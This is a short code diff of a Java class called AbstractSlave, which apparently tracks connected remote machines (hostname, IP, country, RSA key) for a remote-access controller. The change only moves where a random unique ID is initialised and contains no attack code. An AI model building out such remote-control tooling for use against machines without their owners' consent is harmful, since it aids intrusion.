@@ -40,6 +40,8 @@ import com.redpois0n.oslib.OperatingSystem;
 
 public abstract class AbstractSlave implements Runnable {
 	
+	protected final int uniqueId = new Random().nextInt(Integer.MAX_VALUE);
+	
 	protected boolean added;
 	
 	protected ServerListener connection;
@@ -52,9 +54,7 @@ public abstract class AbstractSlave implements Runnable {
 	
 	protected String hostname;
 	protected String renamedid;
-	protected String localip;
-	
-	protected final int uniqueId;
+	protected String localip;	
 	protected String country;
 	protected PublicKey rsaKey;
 	protected byte[] key;
@@ -80,9 +80,7 @@ public abstract class AbstractSlave implements Runnable {
 	private String ip;
 	private String host;
 
-	public AbstractSlave(ServerListener connection, Socket socket) {
-		uniqueId = new Random().nextInt(Integer.MAX_VALUE);
-		
+	public AbstractSlave(ServerListener connection, Socket socket) {		
 		if (connection != null && socket != null) {
 			this.connection = connection;
 			this.socket = socket;
